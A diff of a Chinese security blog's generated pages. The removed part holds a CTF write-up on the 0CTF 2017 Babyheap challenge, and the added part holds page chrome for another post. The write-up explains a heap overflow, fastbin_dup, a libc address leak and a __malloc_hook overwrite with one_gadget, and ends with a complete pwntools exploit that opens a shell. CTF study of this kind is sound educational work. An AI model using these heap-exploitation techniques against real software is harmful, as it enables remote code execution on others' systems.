class="line">&#125;</div></pre></td></tr></table></figure>
-<p>我还原的代码和bin差别还是挺多的，但是4个函数的逻辑基本相同，还原这个代码只是为了方便我调试，所以并不开PIE，然后调试的时候当做我开了😏</p>
-<p>我总结了下，这题已经可以分为三个姿势</p>
-<p>PS: calloc和malloc是差不多的，区别很小，具体的自行google</p>
-<h2 id="leak-libc-address"><a href="#leak-libc-address" class="headerlink" title="leak libc address"></a>leak libc address</h2><p>第一步基本都是想着泄露地址，这题利用堆有一个泄露libc地址的姿势</p>
-<p>首先，先简单的说，一个small bin，它的fd和bk会指向top chunk(剩下的small bin, large bin, unsortbin还有一个remainder我之后应该也会写blog)，指向的不是top chunk的地址，而是指向top chunk指针，再详细点就是，在arena中有一个地方存放的是top chunk的地址，在fastbin之后remainder之前(上一篇讲fastbin的应该有提及到)，而fd和bk就是会指向这个地址，而arena是位于libc的<code>.data</code>区域，所以arena的地址也就是libc的地址，而我们有了libc库，所以也能算出其他地址。</p>
-<p>在这之前，还得解决一个问题，就是怎么输出fd或者是bk，当free了之后就没法dump了。所以这里就得利用到之前提到的<code>fatbin_dup</code>了</p>
-<p>现在就来详细的说下，首先，malloc出下面这样的堆空间</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">地址</th>
-<th style="text-align:center">0-8 byte</th>
-<th style="text-align:center">9-f byte</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">id:0/0x00</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x21</td>
-</tr>
-<tr>
-<td style="text-align:center">0x10</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-</tr>
-<tr>
-<td style="text-align:center">id:1/0x20</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x21</td>
-</tr>
-<tr>
-<td style="text-align:center">0x30</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-</tr>
-<tr>
-<td style="text-align:center">id:2/0x40</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x21</td>
-</tr>
-<tr>
-<td style="text-align:center">0x50</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-</tr>
-<tr>
-<td style="text-align:center">id:3/0x60</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x91</td>
-</tr>
-<tr>
-<td style="text-align:center">0x70</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-</tr>
-<tr>
-<td style="text-align:center">id:4/0xf0</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x91</td>
-</tr>
-</tbody>
-</table>
-<p>首先是malloc出3个fast chunk和两个small chuank，small chunk这里malloc出两个是因为如果free的small chunk下面是top chunk，则触发unlink合并机制，也就没有啥fd和bk了，所以malloc出两个，然后free第一个</p>
-<p>这里还有一个问题，上面表中的地址我可不是乱写的，因为要页对齐的原因，我们虽然不知道malloc的具体地址空间，但是我们却能知道最后一个byte的值就是我上面标的这样的</p>
-<p>第一步我们先free(2)，然后我们再free(1)，这个时候的堆是这样的：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">地址</th>
-<th style="text-align:center">0-8 byte</th>
-<th style="text-align:center">9-f byte</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">id:0/0x00</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x21</td>
-</tr>
-<tr>
-<td style="text-align:center">0x10</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-</tr>
-<tr>
-<td style="text-align:center">0x20</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x21</td>
-</tr>
-<tr>
-<td style="text-align:center">0x30</td>
-<td style="text-align:center">0x40</td>
-<td style="text-align:center">0</td>
-</tr>
-<tr>
-<td style="text-align:center">0x40</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x21</td>
-</tr>
-<tr>
-<td style="text-align:center">0x50</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-</tr>
-</tbody>
-</table>
-<p>然后在bin中有一处很明显的漏洞，fill函数中输入的数据长度是在fill函数中由你输入的，而不是你malloc的长度，所以这里就存在堆溢出，比如我malloc(0x10)，但是我fill却可以输入0x30的数据。</p>
-<p>利用这个方法，我们可以通过fill(0)，从而修改0x30地址的第一个byte，修改成0x60，payload:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">payload += p64(<span class="number">0x21</span>)</div><div class="line">payload += p8(<span class="number">0x60</span>)</div></pre></td></tr></table></figure>
-<p>这样我们再malloc(0x10)，获取到了0x20，再次malloc(0x10)，并不能获得到0x60，讲fastbin的时候讲过，malloc有check机制，会check长度，因为0x60的长度是0x90，所以会失败。</p>
-<p>解决方案也很简单，在free(2)之前，我们先fill(2)，修改成0x21，payload:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">payload += p64(<span class="number">0x21</span>)</div></pre></td></tr></table></figure>
-<p>这个时候的堆是这样的：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">地址</th>
-<th style="text-align:center">0-8 byte</th>
-<th style="text-align:center">9-f byte</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">id:0/0x00</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x21</td>
-</tr>
-<tr>
-<td style="text-align:center">0x10</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-</tr>
-<tr>
-<td style="text-align:center">id:1/0x20</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x21</td>
-</tr>
-<tr>
-<td style="text-align:center">0x30</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-</tr>
-<tr>
-<td style="text-align:center">0x40</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x21</td>
-</tr>
-<tr>
-<td style="text-align:center">0x50</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-</tr>
-<tr>
-<td style="text-align:center">id:3/id:2/0x60</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x21</td>
-</tr>
-</tbody>
-</table>
-<p>然后fill(1)，payload:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">payload += p64(<span class="number">0x21</span>)</div><div class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">payload += p64(<span class="number">0x91</span>)</div></pre></td></tr></table></figure>
-<p>来修复small chunk的size</p>
-<p>这时候就能成功的free(3)</p>
-<p>这个时候的堆：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">地址</th>
-<th style="text-align:center">0-8 byte</th>
-<th style="text-align:center">9-f byte</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">id:0/0x00</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x21</td>
-</tr>
-<tr>
-<td style="text-align:center">0x10</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-</tr>
-<tr>
-<td style="text-align:center">id:1/0x20</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x21</td>
-</tr>
-<tr>
-<td style="text-align:center">0x30</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-</tr>
-<tr>
-<td style="text-align:center">0x40</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x21</td>
-</tr>
-<tr>
-<td style="text-align:center">0x50</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0</td>
-</tr>
-<tr>
-<td style="text-align:center">id:2/0x60</td>
-<td style="text-align:center">0</td>
-<td style="text-align:center">0x91</td>
-</tr>
-<tr>
-<td style="text-align:center">0x70</td>
-<td style="text-align:center">fd(*top_chunk)</td>
-<td style="text-align:center">bk(*top_chunk)</td>
-</tr>
-</tbody>
-</table>
-<p>然后我们再dump(2)，就能获取到libc的地址了</p>
-<h2 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc hook"></a>malloc hook</h2><p>这对我来说也是一个新的知识点</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/36gx 0x7ffff7dd1b20-0x40</div><div class="line">0x7ffff7dd1ae0 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7ffff7dd1af0 &lt;_IO_wide_data_0+304&gt;:	0x00007ffff7dd0260	0x0000000000000000</div><div class="line">0x7ffff7dd1b00 &lt;__memalign_hook&gt;:	0x00007ffff7a92e20	0x00007ffff7a92a00</div><div class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</div><div class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:	0x0000000100000000	0x0000000000000000</div><div class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</div></pre></td></tr></table></figure>
-<p>在arena的上面，有个malloc_hook，当这个地址的值不为0时，我们执行malloc将会先跳到malloc_hook的地址上执行指令</p>
-<p>所以这里就有一个思路了，我们把malloc_hook给赋值一个执行shell指令的地址，该地址假设为0x23333</p>
-<p>然后我们执行malloc函数，不就可以拿到shell了么</p>
-<p>覆盖malloc_hook倒挺简单的，就是通过上面的fastbin_dup方法，malloc出最大是malloc_hook-0x16的地址，然后通过fill来覆盖malloc_hook</p>
-<p>这里的唯一问题就是malloc的长度检查，然后fastbin的size范围是0x20-0x80</p>
-<p>这个问题也好解决，我们可以看看上面的数据，储存了一些地址，而这些地址的高位都是0x7f，所以我们可以修改偏移，这样:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/10gx 0x7ffff7dd1b20-0x33</div><div class="line">0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:	0xfff7dd0260000000	0x000000000000007f</div><div class="line">0x7ffff7dd1afd:	                        0xfff7a92e20000000	0xfff7a92a0000007f</div><div class="line">0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:	    0x000000000000007f	0x0000000000000000</div><div class="line">0x7ffff7dd1b1d:	                        0x0100000000000000	0x0000000000000000</div><div class="line">0x7ffff7dd1b2d &lt;main_arena+13&gt;:	        0x0000000000000000	0x0000000000000000</div></pre></td></tr></table></figure>
-<p>这样，就成功构造了一个有效size</p>
-<p>然后我们利用fastbin_dup，达到malloc(0x60)返回改地址的目的，然后把malloc_hook的地址覆盖成0x23333就好了</p>
-<p>上面的利用过程我们不需要知道具体的地址，我们只需要知道这个地址和我们之前泄露出来的地址之前的差值就能计算出来该地址了</p>
-<h2 id="寻找getshell指令"><a href="#寻找getshell指令" class="headerlink" title="寻找getshell指令"></a>寻找getshell指令</h2><p>我看了别人的wp，发现使用一个<a href="https://github.com/david942j/one_gadget" target="_blank" rel="external">one_gadget</a>工具</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> one_gadget libc.so.6 </span></div><div class="line">0x41374	execve("/bin/sh", rsp+0x30, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x30] == NULL</div><div class="line"></div><div class="line">0xbac7d	execve("/bin/sh", rsi, r12)</div><div class="line">constraints:</div><div class="line">  [rsi] == NULL || rsi == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xbaccc	execve("/bin/sh", [rbp-0x48], r12)</div><div class="line">constraints:</div><div class="line">  [[rbp-0x48]] == NULL || [rbp-0x48] == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xd6e77	execve("/bin/sh", rsp+0x70, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x70] == NULL</div><div class="line"></div><div class="line">0xdaa50	execve("/bin/sh", r9, rdx)</div><div class="line">constraints:</div><div class="line">  [r9] == NULL || r9 == NULL</div><div class="line">  [rdx] == NULL || rdx == NULL</div></pre></td></tr></table></figure>
-<p>可以找到好几个能getshell的指令</p>
-<p>T：那么以前做栈溢出的时候是不是泄露出libc地址后可以直接跳到这个地址了，就不用再自己构造system(‘/bin/sh’)了？下次去试试</p>
-<hr>
-<p>感觉自己从来就不会Pwn……继续努力学习新姿势</p>
-<p>最后附上PoC:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding=utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></div><div class="line">    r.sendline(<span class="string">'1'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(size))</div><div class="line">    r.recvuntil(<span class="string">': '</span>, timeout=<span class="number">5</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx, data)</span>:</span></div><div class="line">    r.sendline(<span class="string">'2'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(len(data)))</div><div class="line">    r.sendafter(<span class="string">': '</span>, data)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'3'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></div><div class="line">    r.sendline(<span class="string">'4'</span>)</div><div class="line">    r.sendlineafter(<span class="string">': '</span>, str(idx))</div><div class="line">    r.recvuntil(<span class="string">': \n'</span>)</div><div class="line">    data = r.recvline()</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    debug = <span class="number">1</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> debug:</div><div class="line">        context.log_level = <span class="string">"debug"</span></div><div class="line">        r = process(<span class="string">"./test"</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        r = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10000</span>)</div><div class="line">    r.recvuntil(<span class="string">': '</span>)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line">    alloc(<span class="number">0x80</span>)</div><div class="line">    alloc(<span class="number">0x80</span>)</div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">    payload += p64(<span class="number">0x21</span>)</div><div class="line">    fill(<span class="number">2</span>, payload)</div><div class="line"></div><div class="line">    free(<span class="number">2</span>)</div><div class="line">    free(<span class="number">1</span>)</div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">3</span></div><div class="line">    payload += p64(<span class="number">0x21</span>)</div><div class="line">    payload += p8(<span class="number">0x60</span>)</div><div class="line">    fill(<span class="number">0</span>, payload)</div><div class="line"></div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line">    alloc(<span class="number">0x10</span>)</div><div class="line"></div><div class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">7</span></div><div class="line">    payload += p64(<span class="number">0x91</span>)</div><div class="line">    fill(<span class="number">1</span>, payload)</div><div class="line">    free(<span class="number">3</span>)</div><div class="line"></div><div class="line">    arena_top = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])</div><div class="line">    log.info(<span class="string">"arena_top_chunk: "</span> + hex(arena_top))</div><div class="line"></div><div class="line">    alloc(<span class="number">0x60</span>)</div><div class="line">    free(<span class="number">3</span>)</div><div class="line"></div><div class="line">    fill(<span class="number">2</span>, p64(arena_top - <span class="number">139</span>))    <span class="comment"># malloc_hook上面的地址</span></div><div class="line">    alloc(<span class="number">0x60</span>)</div><div class="line">    alloc(<span class="number">0x60</span>)</div><div class="line"></div><div class="line">    payload  = <span class="string">'\x00'</span>*<span class="number">3</span></div><div class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span></div><div class="line">    payload += p64(arena_top - <span class="number">3556100</span>)  <span class="comment"># getshell的地址</span></div><div class="line">    fill(<span class="number">5</span>, payload)</div><div class="line"></div><div class="line">    alloc(<span class="number">233</span>)</div><div class="line"></div><div class="line">    r.interactive()</div></pre></td></tr></table></figure>
-]]></content:encoded>
-      
-      <comments>http://0x48.pw/2017/08/01/0x36/#disqus_thread</comments>
-    </item>
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/08/29/0x38/">Pwnhub之奇妙的巨蟒 Writeup</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2017-08-29, 12:01:38</p>
+        <p><span>最后更新:</span>2017-08-29, 12:15:13</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/08/29/0x38/" title="Pwnhub之奇妙的巨蟒 Writeup">http://0x48.pw/2017/08/29/0x38/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2017/08/29/0x38/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/08/07/0x37/">
+                    malloc.c源码阅读之__libc_free
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
     
-  </channel>
-</rss>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2017/08/07/0x37/" title="下一篇: malloc.c源码阅读之__libc_free">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/0x38/">Pwnhub之奇妙的巨蟒 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/07/0x37/">malloc.c源码阅读之__libc_free</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/01/0x36/">堆溢出学习之0CTF 2017 Babyheap</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/25/0x35/">glibc malloc学习笔记之fastbin🐦</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/12/0x34/">对虚拟机进行磁盘扩容🐥</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 Web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分Web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
